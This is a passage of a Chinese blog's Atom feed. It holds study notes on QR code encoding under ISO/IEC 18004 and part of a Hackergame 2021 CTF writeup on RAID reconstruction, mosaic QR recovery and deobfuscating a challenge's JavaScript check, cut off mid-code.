href="/p/12ee036b.html">「QRCode 标准阅读」#3 解码纠错过程</a></p>]]></content>
    
    
    <summary type="html">&lt;div style=&quot;display: flex; justify-content: space-between;&quot;&gt;

&lt;p&gt;&lt;a href=&quot;/p/1c1e6bbc.html&quot;&gt;&amp;lt; #1&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;/p/12ee036b.html&quot;&gt;#3 &amp;gt;&lt;/a&gt;&lt;/p&gt;
&lt;/div&gt;

&lt;h2 id=&quot;纠错码编码（7-5）&quot;&gt;&lt;a href=&quot;#纠错码编码（7-5）&quot; class=&quot;headerlink&quot; title=&quot;纠错码编码（7.5）&quot;&gt;&lt;/a&gt;纠错码编码（7.5）&lt;/h2&gt;&lt;h3 id=&quot;纠错容量（7-5-1）&quot;&gt;&lt;a href=&quot;#纠错容量（7-5-1）&quot; class=&quot;headerlink&quot; title=&quot;纠错容量（7.5.1）&quot;&gt;&lt;/a&gt;纠错容量（7.5.1）&lt;/h3&gt;&lt;p&gt;纠错字（error correction codewords）可以纠正两种错误，一种是比如无法扫描或无法解码的已知位置的错误字（erasures），一种是未知位置的错误字（errors），一个 erasures 可以由一个纠错字纠错，而一个 errors 需要两个纠错字来纠错&lt;/p&gt;</summary>
    
    
    
    
    <category term="笔记" scheme="https://blog.tonycrane.cc/tags/%E7%AC%94%E8%AE%B0/"/>
    
    <category term="CTF" scheme="https://blog.tonycrane.cc/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>「QRCode 标准阅读」#1 构成及数据编码</title>
    <link href="https://blog.tonycrane.cc/p/1c1e6bbc.html"/>
    <id>https://blog.tonycrane.cc/p/1c1e6bbc.html</id>
    <published>2021-11-29T16:20:06.000Z</published>
    <updated>2021-12-01T15:02:30.141Z</updated>
    
    <content type="html"><![CDATA[<div style="display: flex; justify-content: space-between;"><p><a href="/p/409d352d.html">&lt; #0</a></p><p><a href="/p/f956b4.html">#2 &gt;</a></p></div><h2 id="基础描述及结构（6-1、6-3）"><a href="#基础描述及结构（6-1、6-3）" class="headerlink" title="基础描述及结构（6.1、6.3）"></a>基础描述及结构（6.1、6.3）</h2><h3 id="基础描述（5-3、6-1）"><a href="#基础描述（5-3、6-1）" class="headerlink" title="基础描述（5.3、6.1）"></a>基础描述（5.3、6.1）</h3><ul><li>块位置：左上角为原点 (0, 0) 向下x+，向右y+</li><li>版本表示：Version V-E（其中V是版本号，E是纠错等级）</li><li>数据表示：黑块-1 白块-0（可以带背景全部反色）</li><li>大小：从版本1到版本40依次是 21x21 ～ 177x177（每增加一个版本，边长增加4）<span id="more"></span></li><li>支持的最多字符数（版本40）<ul><li>数字模式：7089</li><li>字母模式：4296</li><li>字节模式：2953</li><li>日文模式：1817</li></ul></li><li>纠错等级允许的恢复比例<ul><li>L：7%</li><li>M：15%</li><li>Q：25%</li><li>H：30%</li></ul></li></ul><h3 id="二维码结构（6-3）"><a href="#二维码结构（6-3）" class="headerlink" title="二维码结构（6.3）"></a>二维码结构（6.3）</h3><ul><li>功能图案（function patterns）<ul><li>特征符（finder pattern）7x7黑圈 5x5白圈 3x3黑块</li><li>分割线（separator）在特征符周围的一圈全白区域</li><li>时序图案（timing patterns）第7行第7列的两条黑白条纹</li><li>对齐图案（alignment patterns）版本1无，版本2-6 1个，版本7-13 6个……（附录E）</li><li>静默区（quiet zone）至少4个单位宽</li></ul></li><li>编码区域（encoding region）<ul><li>格式信息（format information）左上角分割线外一圈，左下角分割线右侧，右上角分割线下侧</li><li>版本信息（version information）版本7后才有，在左下分割线上侧，右上分割线左侧</li><li>数据及纠错码区域</li></ul></li></ul><p><img src="/p/1c1e6bbc/structure.png"></p><h2 id="数据编码（7-4）"><a href="#数据编码（7-4）" class="headerlink" title="数据编码（7.4）"></a>数据编码（7.4）</h2><h3 id="数据序列（7-4-1）"><a href="#数据序列（7-4-1）" class="headerlink" title="数据序列（7.4.1）"></a>数据序列（7.4.1）</h3><p>默认的 ECI 模式下，比特流以模式标识符开始。如果不是默认 ECI 模式，则需要从 ECI 头开始：</p><ul><li>（4 bits）ECI 模式标识符</li><li>（8/16/24 bits）ECI Designator</li></ul><p>比特流的剩余部分由下面几部分组成：</p><ul><li>（4 bits）模式标识符</li><li>字符数量标识符（长度见下第二个表）</li><li>数据比特流</li></ul><table><thead><tr><th align="center">模式</th><th align="center">标识符</th><th align="left">说明</th></tr></thead><tbody><tr><td align="center">ECI</td><td align="center">0111</td><td align="left"></td></tr><tr><td align="center">数字模式</td><td align="center">0001</td><td align="left">只包含数字0-9，3个数字 10 bits</td></tr><tr><td align="center">字母数字模式</td><td align="center">0010</td><td align="left">45个字符，0-9A-Z 及9个符号 空格$%*+-./:，2个字符 11 bits</td></tr><tr><td align="center">字节模式</td><td align="center">0100</td><td align="left">每个字符 8 bits</td></tr><tr><td align="center">日本汉字模式</td><td align="center">1000</td><td align="left"></td></tr><tr><td align="center">结构添加模式</td><td align="center">0011</td><td align="left"></td></tr></tbody></table><table><thead><tr><th align="center">版本</th><th align="center">数字模式字符数量标识符长度</th><th align="center">字母模式……</th><th>字节模式……</th><th align="center">日文模式……</th></tr></thead><tbody><tr><td align="center">1～9</td><td align="center">10</td><td align="center">9</td><td>8</td><td align="center">8</td></tr><tr><td align="center">10～26</td><td align="center">12</td><td align="center">11</td><td>16</td><td align="center">10</td></tr><tr><td align="center">27～40</td><td align="center">14</td><td align="center">13</td><td>16</td><td align="center">12</td></tr></tbody></table><h3 id="ECI-模式（7-4-2）"><a href="#ECI-模式（7-4-2）" class="headerlink" title="ECI 模式（7.4.2）"></a>ECI 模式（7.4.2）</h3><p>ECI 模式即使用某些特定的字符映射来把字符转换为比特流</p><p>而且都使用字节模式来表示数据（即在 ECI 头后的模式标识符为字节模式的 0100）</p><p>每个 ECI 都有一个六位数编号（assignment value），可能占 1、2、3 个 codewords，具体标识方式见下表（占1个 codewords 时开头一定是0，占2个时开头一定是10，占3个时开头一定是110）表中 xxxxxxxx 表示编号的二进制</p><table><thead><tr><th align="center">ECI Assignment Value</th><th>Codewords values</th></tr></thead><tbody><tr><td align="center">000000 ～ 000127</td><td>0xxxxxxx</td></tr><tr><td align="center">000000 ～ 016383</td><td>10xxxxxx xxxxxxxx</td></tr><tr><td align="center">000000 ～ 999999</td><td>110xxxxx xxxxxxxx xxxxxxxx</td></tr></tbody></table><p>而且 ECI 模式下中途可以更换 ECI 指示器，一个 5C（01011100）表示换新的 ECI，后面要接6个 codewords 即6个数字（十六进制30～39）表示编号，而不是用上表中的表示方法。而 5C 正常情况下表示 \ ，所以表示 \ 这个原数据需要用两个 5C</p><ul><li><strong>例子 1</strong><ul><li>使用 ISO/IEC 8859-7（ECI 000009）来表示希腊字母ΑΒΓΔΕ（该 ECI 下表示为十六进制 A1 A2 A3 A4 A5）</li><li>比特流：<ul><li>ECI 标识符：<code>0111</code></li><li>ECI 编号：<code>00001001</code></li><li>字节模式标识符：<code>0100</code></li><li>字符数量：<code>00000101</code>（5个字符）</li><li>数据：<code>10100001 10100010 10100011 10100100 10100101</code></li></ul></li><li>所以最终的比特流：<code>0111 00001001 0100 00000101 10100001 10100010 10100011 10100100 10100101</code></li></ul></li><li><strong>例子 2（14.3）</strong><ul><li>需要编码的数据：ABC\123456<ul><li>数据流中十六进制（字节模式标识符0100后）：41 42 43 5C 5C 31 32 33 34 35 36</li></ul></li><li>需要编码的数据：ABC&lt;后接 ECI 123456 下的数据……&gt;<ul><li>数据流中十六进制（字节模式标识符0100后）：41 42 43 5C 31 32 33 34 35 36 ……</li></ul></li></ul></li></ul><h3 id="数字模式（7-4-3）"><a href="#数字模式（7-4-3）" class="headerlink" title="数字模式（7.4.3）"></a>数字模式（7.4.3）</h3><p>输入的数字字符串（因为开头可以是0）要被分成3个一组，每组会转换为 10 bits 的二进制串（999 -&gt; <code>1111100111</code>）。剩余不到3个的部分，如果剩2个数字，则将其转换为 7 bits 的二进制串（99 -&gt; <code>1100011</code>）如果剩1个数字，则将其转换为 4 bits 的二进制串（9 -&gt; <code>1001</code>）</p><p>然后开头加上数字模式标识符 <code>0001</code> 和数量标识符（字符个数转为二进制，并开头补0至长度，长度由版本决定，见上 7.4.1 部分的第二个表）</p><ul><li><strong>例子</strong><ul><li>数据内容： <code>01234567</code>（保留开头0）</li><li>数据流部分：<ul><li>数字模式标识符： <code>0001</code></li><li>数量标识符： <code>0000001000</code>（8，且版本1下规定为 10 bits）</li><li>数据：<ul><li>012 -&gt; <code>0000001100</code></li><li>345 -&gt; <code>0101011001</code></li><li>67 -&gt; <code>1000011</code></li></ul></li></ul></li><li>完整数据比特流： <code>0001 0000001000 0000001100 0101011001 1000011</code></li></ul></li></ul><p>数字模式下的比特流长度为：</p><p>$$B=M+C+10\times\lfloor\frac{D}{3}\rfloor+R$$</p><p>其中 M 为 4，C 为数量标识符长度（版本1～9为 10，版本10～26为 12，版本27～40为 14），D为输入字符个数，R为剩余部分（若 D mod 3 = 0 则为 0，若 D mod 3 = 1 则为 4，若 D mod 3 = 2 则为 7）</p><h3 id="字母数字模式（7-4-4）"><a href="#字母数字模式（7-4-4）" class="headerlink" title="字母数字模式（7.4.4）"></a>字母数字模式（7.4.4）</h3><p>数字字母模式（Alphanumeric mode）下支持的编码字符有45个，把它们从0编号至44。其中 0-9 对应数字 0-9，10-35 对应字母 A-Z，36-44 对应9个符号：</p><p><img src="/p/1c1e6bbc/alnum.png"></p><p>输入的字符先按照上表转换为数值，然后分为两个一组，每一组内把 第一个数值 × 45 + 第二个数值，再转换为长度为 11 bits 的二进制串（最大为 44×45+44=2024 -&gt; <code>11111101000</code>）。如果字符长度为奇数，则会剩余出一个字符，需要将其值转换为长度为 6 bits 的二进制串（最大为 11 -&gt; <code>101100</code>）</p><p>然后开头加上字母数字模式标识符 <code>0010</code> 和数量标识符（长度由 7.4.1 第二个表规定）</p><ul><li><strong>例子</strong><ul><li>数据内容：AC-42</li><li>数据流部分：<ul><li>字母数字模式标识符： <code>0010</code></li><li>数量标识符： <code>000000101</code>（5，且版本1下规定长度为9）</li><li>数据：AC-42 -&gt; 10 12 41 4 2 -&gt; (10 12)(41 4)(2)<ul><li>10 12 -&gt; 10*45+12=462 -&gt; <code>00111001110</code></li><li>41 4 -&gt; 41*45+4=1849 -&gt; <code>11100111001</code></li><li>2 -&gt; 2 -&gt; <code>000010</code> </li></ul></li></ul></li><li>完整数据比特流： <code>0010 000000101 00111001110 11100111001 000010</code></li></ul></li></ul><p>字母数字模式下的比特流长度为：</p><p>$$B=M+C+11\times\lfloor\frac{D}{2}\rfloor+6\times(D\bmod 2)$$</p><p>其中 M 为 4，C 为数量标识符长度，D 为原数据长度</p><h3 id="字节模式（7-4-5）"><a href="#字节模式（7-4-5）" class="headerlink" title="字节模式（7.4.5）"></a>字节模式（7.4.5）</h3><p>字节模式（Byte mode）下把每个字符根据 Latin-1（ISO/IEC 8859-1）编码成 8 bits（1字节），直接接在字节模式标识符 <code>0100</code> 和数量标识符（长度由 7.4.1 第二个表规定）的后面。</p><p><img src="/p/1c1e6bbc/Latin-1.png" alt="Latin-1"></p><p>字节模式下的比特流长度：</p><p>$$B=M+C+8\times D$$</p><p>其中 M 为 4，C 为数量标识符长度，D 为原数据长度</p><h4 id="中文编码"><a href="#中文编码" class="headerlink" title="中文编码"></a>中文编码</h4><p>中文在转换成比特流的时候也使用字节模式，需要用 UTF-8 编码，每个字符会被编码成 3 个字节</p><h3 id="混合模式（7-4-7）"><a href="#混合模式（7-4-7）" class="headerlink" title="混合模式（7.4.7）"></a>混合模式（7.4.7）</h3><p>一个二维码的数据流中也可以使用多种模式，且不需要特别表示。更换新的模式时只需要正常添加 模式标识符+数量标识符+数据 即可</p><p><img src="/p/1c1e6bbc/multi.png"></p><ul><li><strong>例子</strong><ul><li>原始数据：123测试</li><li>数据流：<ul><li>数字模式：<ul><li>标识符： <code>0001</code></li><li>数量标识符： <code>0000000011</code>（3，长度10）</li><li>数据：123 -&gt; <code>0001111011</code></li></ul></li><li>字节模式：测试 -&gt; E6 B5 8B / E8 AF 95<ul><li>标识符： <code>0100</code></li><li>数量标识符： <code>00000110</code>（6，长度8）</li><li>数据：<ul><li>测 -&gt; <code>11100110 10110101 10001011</code></li><li>试 -&gt; <code>11101000 10101111 10010101</code></li></ul></li></ul></li></ul></li><li>完整数据比特流： <code>0001 0000000011 0001111011 0100 00000110 11100110 10110101 10001011 11101000 10101111 10010101</code></li></ul></li></ul><h3 id="结束符（7-4-9）"><a href="#结束符（7-4-9）" class="headerlink" title="结束符（7.4.9）"></a>结束符（7.4.9）</h3><p>在数据的末尾要填充4个0作为结束符，如果容量不足的话可以缩短或省略<br>即能填下则加4个0，填不下则能加几个0就加几个0</p><h3 id="填充-padding-bits（7-4-10）"><a href="#填充-padding-bits（7-4-10）" class="headerlink" title="填充 padding bits（7.4.10）"></a>填充 padding bits（7.4.10）</h3><p>转换后的数据比特流还需要填充至二维码的数据容量</p><ol><li>首先先用 <code>0</code> 补充比特流长度到 8 的整数倍</li><li>然后用 <code>11101100</code> 和 <code>00010001</code> 交替填补到二维码数据容量</li></ol><p>具体的数据容量由版本号和纠错等级决定，且数据容量（比特）一定为8的倍数，完整数据见文档的 33～36 页（整个 pdf 的第 41～44 页）</p><p>注：这个地方 QRazyBox 网站存在 bug，有时无法正常识别填充的 0 比特和 padding bits（即可能把填充的 0 中前四个视为一个 terminator，把后面的 0 才视为属于 padding bits ）</p><hr><p>未完待续……<a href="/p/f956b4.html">「QRCode 标准阅读」#2 纠错码编码与图像生成</a></p>]]></content>
    
    
    <summary type="html">&lt;div style=&quot;display: flex; justify-content: space-between;&quot;&gt;

&lt;p&gt;&lt;a href=&quot;/p/409d352d.html&quot;&gt;&amp;lt; #0&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;/p/f956b4.html&quot;&gt;#2 &amp;gt;&lt;/a&gt;&lt;/p&gt;
&lt;/div&gt;

&lt;h2 id=&quot;基础描述及结构（6-1、6-3）&quot;&gt;&lt;a href=&quot;#基础描述及结构（6-1、6-3）&quot; class=&quot;headerlink&quot; title=&quot;基础描述及结构（6.1、6.3）&quot;&gt;&lt;/a&gt;基础描述及结构（6.1、6.3）&lt;/h2&gt;&lt;h3 id=&quot;基础描述（5-3、6-1）&quot;&gt;&lt;a href=&quot;#基础描述（5-3、6-1）&quot; class=&quot;headerlink&quot; title=&quot;基础描述（5.3、6.1）&quot;&gt;&lt;/a&gt;基础描述（5.3、6.1）&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;块位置：左上角为原点 (0, 0) 向下x+，向右y+&lt;/li&gt;
&lt;li&gt;版本表示：Version V-E（其中V是版本号，E是纠错等级）&lt;/li&gt;
&lt;li&gt;数据表示：黑块-1 白块-0（可以带背景全部反色）&lt;/li&gt;
&lt;li&gt;大小：从版本1到版本40依次是 21x21 ～ 177x177（每增加一个版本，边长增加4）&lt;/li&gt;&lt;/ul&gt;</summary>
    
    
    
    
    <category term="笔记" scheme="https://blog.tonycrane.cc/tags/%E7%AC%94%E8%AE%B0/"/>
    
    <category term="CTF" scheme="https://blog.tonycrane.cc/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>「QRCode 标准阅读」#0 总章</title>
    <link href="https://blog.tonycrane.cc/p/409d352d.html"/>
    <id>https://blog.tonycrane.cc/p/409d352d.html</id>
    <published>2021-11-29T16:03:39.000Z</published>
    <updated>2022-12-12T13:04:52.374Z</updated>
    
    <content type="html"><![CDATA[<p>最近几次比赛遇到过好几次二维码的题目，打算好好来读一读标准文档 <a href="https://gcore.jsdelivr.net/gh/tonycrane/tonycrane.github.io/p/409d352d/ISO_IEC18004-2015.pdf">ISO/IEC 18004:2015</a><br>文档 6.1 前面的内容不多，就从它后面开始记了</p><h2 id="Table-of-Content"><a href="#Table-of-Content" class="headerlink" title="Table of Content"></a>Table of Content</h2><ul><li><a href="/p/1c1e6bbc.html">「QRCode 标准阅读」#1 构成及数据编码</a><br>  对应文档中的 6.1~7.4 部分</li><li><a href="/p/f956b4.html">「QRCode 标准阅读」#2 纠错码编码与图像生成</a><br>  对应文档中的 7.5～7.10 部分</li><li><a href="/p/12ee036b.html">「QRCode 标准阅读」#3 解码纠错过程</a><br>  对应文档中的 11 部分以及补充了 PGZ 解码相关内容</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;最近几次比赛遇到过好几次二维码的题目，打算好好来读一读标准文档 &lt;a href=&quot;https://gcore.jsdelivr.net/gh/tonycrane/tonycrane.github.io/p/409d352d/ISO_IEC18004-2015.pdf&quot;&gt;IS</summary>
      
    
    
    
    
    <category term="笔记" scheme="https://blog.tonycrane.cc/tags/%E7%AC%94%E8%AE%B0/"/>
    
    <category term="CTF" scheme="https://blog.tonycrane.cc/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>「Hackergame 2021」#4 Writup 持续破防篇 1</title>
    <link href="https://blog.tonycrane.cc/p/d11ec8ed.html"/>
    <id>https://blog.tonycrane.cc/p/d11ec8ed.html</id>
    <published>2021-10-29T12:41:06.000Z</published>
    <updated>2021-10-30T05:06:00.775Z</updated>
    
    <content type="html"><![CDATA[<p><a href="/p/f152ab1f.html">&lt; #3</a></p><p>这里接<a href="/p/fd872e78.html">上一篇</a>，Writeup 的有：阵列恢复、马赛克、minecRaft、密码生成器<br>（其实 minecRaft 应该算“开局上分”篇，但是不好塞了，就放这里了）<br>剩下的就是做不上的了，看官方 Writeup 了（</p><span id="more"></span><h2 id="阵列恢复大师"><a href="#阵列恢复大师" class="headerlink" title="阵列恢复大师"></a>阵列恢复大师</h2><p>（这题整整做了我两天多，每天晚上都对着磁盘阵列……）</p><blockquote><p>以下是两个压缩包，分别是一个 RAID 0 阵列的磁盘压缩包，和一个 RAID 5 阵列的磁盘压缩包，对应本题的两小问。你需要解析得到正确完整的磁盘阵列，挂载第一个分区后在该分区根目录下使用 Python 3.7 或以上版本执行 getflag.py 脚本以获取 flag。磁盘数据保证无损坏。</p></blockquote><h3 id="RAID-5"><a href="#RAID-5" class="headerlink" title="RAID 5"></a>RAID 5</h3><p>虽然 RAID 5 是第二问，而且分数高，但是更好做，而且做出的人也多。<br>因为数据保证无损坏，所以要做的仅仅是找出五个磁盘的顺序和块大小</p><p>顺序可以先简单地看看 strings *.img 输出的内容<br>逐个文件看，可以发现每个文件比较靠前的地方会有一段是 git 历史记录的一部分:<br><img src="/p/d11ec8ed/raid5.png"><br>根据里面的时间可以推断出磁盘的顺序大致是：</p><p style="text-align: center;">Qj... -> 60... -> 3R... -> Ir... -> 3D...</p>只是，这个顺序应该是一个环，谁在第一还没区分出来<p>在看每个文件的头部，只有 60… 和 3R… 有 “EFI PART”:<br><img src="/p/d11ec8ed/raid5_.png"><br>所以应该是一个在开头，一个在结尾。所以最终的顺序是：</p><p style="text-align: center;">3R... -> Ir... -> 3D... -> Qj... -> 60...</p><p>然后需要找到块大小<br>直接丢到 DiskGenius 里组建虚拟 RAID，选左同步，然后可以试出来当块大小是 64k 的时候正好可以拼出完整磁盘<br>然后克隆磁盘生成 img 文件，再挂载，进入，执行 getflag.py 就得到了 flag </p><h3 id="RAID-0"><a href="#RAID-0" class="headerlink" title="RAID 0"></a>RAID 0</h3><p>在做 RAID 5 的时候还发现了一个叫 Raid Reconstructor 的软件，可以爆破 RAID 阵列顺序和块大小<br>所以这问也就懒得看了，直接丢给 Raid Reconstructor 来爆破，得到最推荐的顺序：</p><p style="text-align: center;">wl. -> jC. -> 1G. -> 5q. -> d3. -> eR. -> RA. -> ID.</p>和块大小 128k<p>然后直接用 Raid Reconstructor 的 Copy 导出 img 文件，提取后又得到一个新的 img 文件<br>通过 file 可以看到结果的文件系统是 XFS</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ file MyDisk.img</span><br><span class="line">MyDisk.img: SGI XFS filesystem data (blksz 4096, inosz 512, v2 <span class="built_in">dirs</span>)</span><br></pre></td></tr></table></figure><p>但是始终无法挂载（搞了一天）<br>可能是 Raid Reconstructor 的问题，所以又用 DiskGenius 试了下<br>因为 win 和 DiskGenius 读不了 XFS 文件系统，所以拼起来之后直接克隆出 img 文件<br>然后拖到 Kali Linux 里挂载，成功挂载后进入、运行 getflag.py 就得到了 flag </p><hr><h2 id="马赛克"><a href="#马赛克" class="headerlink" title="马赛克"></a>马赛克</h2><p>（这道题已经做破防了，本以为是个青铜，结果是个王者……）<br>我做的肯定不是正解，利用二维码纠错能力勉强拿到了 flag，所以就不详细写 writeup 了，主要还是要看官方 wp（逃</p><p>大概步骤就是：</p><ol><li>读图片</li><li>把已知的像素提取出来</li><li>把四个小定位块填上</li><li>挨个马赛克块寻找使还原的数据平均数与原马赛克值差的绝对值小于1的填补方法<ul><li>如果只有一种就填上，并且标注已经填好，以后不再搜寻</li><li>如果有多种就先放下不填</li></ul></li><li>重复4的过程，这是还会有唯一确定的填补方案。重复4次大概就不剩唯一解了</li><li>这时重复4，找出仅有2中填补方法的，选误差最小的填上</li><li>然后再重复4</li><li>然后重复6</li><li>然后重复4 </li><li>这时可以看到已经还原得差不多了，剩下的不管直接扫码也可以扫出 flag 了 <div style="text-align: center;"><img src="/p/d11ec8ed/msc.jpg" width="35%" height="35%"></div></li></ol><p><del>看，做法很烂对吧</del></p><hr><h2 id="minecRaft"><a href="#minecRaft" class="headerlink" title="minecRaft"></a>minecRaft</h2><blockquote><p>kk 同学很喜欢玩 Minecraft，他最近收到了一张 MC 地图，地图里面有三盏灯，还有很多奇奇怪怪的压力板。</p><p>但他发现这些灯好像不太符合 MC 电磁学（Red stone），你能帮他把灯全部点亮吗？</p><p>注：本题解法与原版 Minecraft 游戏无关。</p><p>补充说明：flag 花括号内为让三盏灯全部点亮的最短的输入序列。例如，如果踩踏压力板输入的最短的序列为 abc，则答案为 flag{abc}。</p></blockquote><p>还挺好玩的题，在网页中模拟了一个mc出来<br>看源码看到了引入了 flag.js 文件，所以可能就是要通过它来得到答案：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;jsm/miscs/flag.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>也可以看到，最终判断是否正确是通过调用 <code>gyflagh(input)</code> 是否为 true 来判断，而 gyflagh 也在 flag.js 中，所以还是要看 flag.js </p><p>但是 flag.js 是经过简单混淆过的，还是要费点时间读一下</p><p>其中有四个转换 Str4 Base16 和 Long 的函数可以略掉不管<br>注意到了 <code>_0x381b()</code> 这个函数里有一个列表，而且比较简单，其实它返回的就是这个列表</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[&#x27;encrypt&#x27;, &#x27;33MGcQht&#x27;, &#x27;6fbde674819a59bfa12092565b4ca2a7a11dc670c678681daf4afb6704b82f0c&#x27;, &#x27;14021KbbewD&#x27;, &#x27;charCodeAt&#x27;, &#x27;808heYYJt&#x27;, &#x27;5DlyrGX&#x27;, &#x27;552oZzIQH&#x27;, &#x27;fromCharCode&#x27;, &#x27;356IjESGA&#x27;, &#x27;784713mdLTBv&#x27;, &#x27;2529060PvKScd&#x27;, &#x27;805548mjjthm&#x27;, &#x27;844848vFCypf&#x27;, &#x27;4bIkkcJ&#x27;, &#x27;1356853149054377&#x27;, &#x27;length&#x27;, &#x27;slice&#x27;, &#x27;1720848ZSQDkr&#x27;]</span><br></pre></td></tr></table></figure><p>但是在 Console 里面调用 _0x381b 得到的却是以 ‘slice’ 开头、’length’ 结尾的列表，将这个列表记为 lst 方便表述<br>而且源码中只有最开头的调用匿名函数里面有 <code>[&#39;push&#39;]</code> 和 <code>[&#39;shift&#39;]</code>，所以推测这个匿名函数就是将这个列表循环右移两个位置<br>那这个匿名函数也不用看了</p><p>再来看 <code>_0x2c9e()</code> 这个函数：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">_0x2c9e</span>(<span class="params">_0x49e6ff, _0x310d40</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> _0x381b4c = _0x381b();</span><br><span class="line">    <span class="keyword">return</span> _0x2c9e = <span class="function"><span class="keyword">function</span>(<span class="params">_0x2c9ec6, _0x2ec3bd</span>) </span>&#123;</span><br><span class="line">        _0x2c9ec6 = _0x2c9ec6 - <span class="number">0x1a6</span>;</span><br><span class="line">        <span class="keyword">let</span> _0x4769df = _0x381b4c[_0x2c9ec6];</span><br><span class="line">        <span class="keyword">return</span> _0x4769df;</span><br><span class="line">    &#125;</span><br><span class="line">    ,</span><br><span class="line">    _0x2c9e(_0x49e6ff, _0x310d40);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中 <code>_0x381b4c</code> 是刚刚说的那个列表 lst。然后 return 里面重新定义了 <code>_0x2c9e</code>，但是新的定义里第二个参数并没有用，然后调用返回，所以整个函数就相当于：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">_0x2c9e</span>(<span class="params">_0x2c9ec6, ...</span>) </span>&#123;</span><br><span class="line">    _0x2c9ec6 = _0x2c9ec6 - <span class="number">0x1a6</span>;</span><br><span class="line">    <span class="keyword">return</span> lst[_0x2c9ec6];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>0x1a6 是 422，所以整个函数也就相当于 function(x) { return lst[x - 422]; }<br>同时根据第一行，程序中所有 <code>_0x22517d</code> 也是这个函数</p><p>然后看判断答案的 <code>gyflagh</code> 函数</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">gyflagh</span>(<span class="params">_0x111955</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> _0x50051f = _0x22517d;</span><br><span class="line">    <span class="keyword">let</span> _0x3b790d = _0x111955[_0x50051f(<span class="number">0x1a8</span>)](_0x50051f(<span class="number">0x1b7</span>));</span><br><span class="line">    <span class="keyword">if</span> (_0x3b790d === _0x50051f(<span class="number">0x1aa</span>))</span><br><span class="line">        <span class="keyword">return</span> !![];</span><br><span class="line">    <span class="keyword">return</span> ![];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>没啥特别的，结合 lst 可以得到：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">gyflagh</span>(<span class="params">ans</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (ans[<span class="string">&quot;encrypt&quot;</span>](<span class="string">&quot;1356853149054377&quot;</span>) === <span class="string">&quot;6fbde674819a59bfa12092565b4ca2a7a11dc670c678681daf4afb6704b82f0c&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后就可以结合 lst 中的值和索引，翻译出最重要的函数<br>再进行一些运算，用注释标注一下已知的值就可以得到：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">String</span>[<span class="string">&quot;prototype&quot;</span>][<span class="string">&quot;encrypt&quot;</span>] = <span class="function"><span class="keyword">function</span>(<span class="params">key</span>) </span>&#123; <span class="comment">// key = &quot;1356853149054377&quot;</span></span><br><span class="line">    <span class="keyword">const</span> left = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">2</span>);</span><br><span class="line">    <span class="keyword">const</span> right = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">4</span>);</span><br><span class="line">    <span class="keyword">let</span> res = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    ans = <span class="built_in">escape</span>(<span class="built_in">this</span>); <span class="comment">// this := ans</span></span><br><span class="line">    right = [<span class="number">909456177</span>, <span class="number">825439544</span>, <span class="number">892352820</span>, <span class="number">926364468</span>]</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; ans[<span class="string">&quot;length&quot;</span>]; i = i + <span class="number">8</span>) &#123;</span><br><span class="line">      left[<span class="number">0</span>] = Str4ToLong(ans[<span class="string">&quot;slice&quot;</span>](i, i + <span class="number">4</span>));</span><br><span class="line">      left[<span class="number">1</span>] = Str4ToLong(ans[<span class="string">&quot;slice&quot;</span>](i + <span class="number">4</span>, i + <span class="number">8</span>));</span><br><span class="line">      code(left, right);</span><br><span class="line">      res = res + 